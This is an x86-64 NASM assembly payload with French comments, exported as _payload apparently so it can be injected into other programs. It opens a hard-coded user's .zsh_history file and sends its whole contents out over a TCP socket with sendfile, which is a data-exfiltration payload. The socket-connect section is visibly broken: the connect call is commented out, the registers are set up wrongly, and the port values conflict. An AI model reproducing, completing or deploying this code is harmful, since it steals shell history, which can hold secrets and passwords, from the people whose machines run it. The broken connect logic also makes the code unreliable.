[BITS 64]

global _payload
global _payload_size

%macro pushx 1-*
%rep %0
	push %1
	%rotate 1
%endrep
%endmacro

%macro popx 1-*
%rep %0
	%rotate -1
	pop %1
%endrep
%endmacro

section .data
    path db '/home/maxence/.zsh_history', 0
    addr_ip dd 0
    port dw 0x0
    stat_buffer times 144 db 0  ; Taille de struct stat sur x86-64
    sockaddr_in:
        ; La structure sockaddr_in est composée de :
        ; - sin_family: 2 octets
        ; - sin_port: 2 octets
        ; - sin_addr: 4 octets
        ; - sin_zero: 8 octets
        ; Taille totale: 16 octets
        ; Nous définissons la structure en mémoire ici.
        ; db 16                      ; sin_len
        dw 2                       ; sin_family (AF_INET)
        dw 0xba0b                  ; sin_port (3002 en hex)
        dd 0                       ; sin_addr (INADDR_ANY)
        times 8 db 0               ; sin_zero (8 octets de zéros)

section .text
global _payload

_payload:
    ; Sauvegarde des registres
	pushx rbx, rbp, r12, r13, r14, r15

    ; Ouvrir le fichier
    mov rax, 2                    ; SYS_open
    lea rdi, [rel path]           ; Chemin du fichier
    mov rsi, 0                    ; O_RDONLY
    syscall
    test rax, rax
    js exit                       ; Si erreur, quitter
    mov r12, rax                  ; Sauvegarder le descripteur de fichier dans r12

    ; Obtenir les informations du fichier
    mov rax, 4                    ; SYS_stat
    lea rdi, [rel path]           ; Chemin du fichier
    lea rsi, [rel stat_buffer]    ; Buffer de stat
    syscall
    test rax, rax
    js close_file                 ; Si erreur, fermer le fichier et quitter

    ; Créer la socket
    mov rax, 41                   ; SYS_socket
    mov rdi, 2                    ; AF_INET
    mov rsi, 1                    ; SOCK_STREAM
    mov rdx, 0                    ; 0
    syscall
    test rax, rax
    js close_file                 ; Si erreur, fermer le fichier et quitter
    mov r13, rax                  ; Sauvegarder le descripteur de socket dans r13

    ; Préparer la structure sockaddr_in
	xor rax,rax
	push rax                ;0,0
	push WORD 0x697a        ;htonos(31337)
	push WORD 0x02          ;2
	mov ecx,esp

	push 0x16               ;sizeof(host_addr)
	push rcx                ;host_addr
	push rsi
	xor rbx,rbx
	mov rcx,rsp
    ; lea rdi, [rel sockaddr_in]
    ; mov rax, 42                   ; SYS_connect
    ; mov rsi, r13                  ; Socket
    ; mov rdx, 16                   ; Taille de sockaddr_in
    syscall
    test rax, rax
    js close_socket               ; Si erreur, fermer la socket et le fichier, et quitter

    ; Envoyer le fichier via la socket
    mov rax, 40                   ; SYS_sendfile
    mov rdi, r13                  ; Socket
    mov rsi, r12                  ; Descripteur de fichier
    xor rdx, rdx                  ; Offset (0)
    mov r10, [rel stat_buffer + 48] ; Taille du fichier
    syscall
    test rax, rax
    js close_socket               ; Si erreur, fermer la socket et le fichier, et quitter

    ; Fin propre
    jmp cleanup

close_socket:
    ; Fermer la socket
    mov rax, 3                    ; SYS_close
    mov rdi, r13                  ; Descripteur de socket
    syscall

close_file:
    ; Fermer le fichier
    mov rax, 3                    ; SYS_close
    mov rdi, r12                  ; Descripteur de fichier
    syscall

cleanup:
    ; Restaurer les registres
	popx rbx, rbp, r12, r13, r14, r15

exit:
    ; Quitter le programme
    mov rax, 60                   ; SYS_exit
    xor rdi, rdi                  ; Code de sortie 0
    syscall
